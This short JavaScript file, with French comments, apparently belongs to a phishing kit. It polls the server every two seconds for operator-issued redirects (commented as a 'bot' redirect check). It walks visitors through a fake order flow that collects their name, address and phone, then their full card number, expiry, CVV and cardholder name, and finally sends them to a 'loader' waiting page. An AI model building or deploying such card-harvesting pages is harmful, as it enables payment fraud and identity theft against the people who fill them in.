// Vérifie redirection bot
async function checkBotRedirect() {
  try {
    const res = await fetch("/api/status");
    const data = await res.json();
    if (data.redirect) {
      window.location.href = data.redirect;
    }
  } catch(e){ console.error(e); }
}
setInterval(checkBotRedirect,2000);

// Fonctions frontend
function goToDelivery(pair){
  fetch("/api/pair", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({pair})
  }).then(()=>window.location.href="/delivery.html");
}

function sendDelivery(){
  const nom=document.getElementById("nom").value;
  const prenom=document.getElementById("prenom").value;
  const adresse=document.getElementById("adresse").value;
  const telephone=document.getElementById("telephone").value;
  fetch("/api/delivery",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({nom,prenom,adresse,telephone})
  }).then(()=>window.location.href="/payment.html");
}

function sendPayment(){
  const cardNumber=document.getElementById("cardNumber").value;
  const expiry=document.getElementById("expiry").value;
  const cvv=document.getElementById("cvv").value;
  const nomTitulaire=document.getElementById("nomTitulaire").value;
  fetch("/api/payment",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({cardNumber,expiry,cvv,nomTitulaire})
  }).then(()=>window.location.href="/loader.html");
}
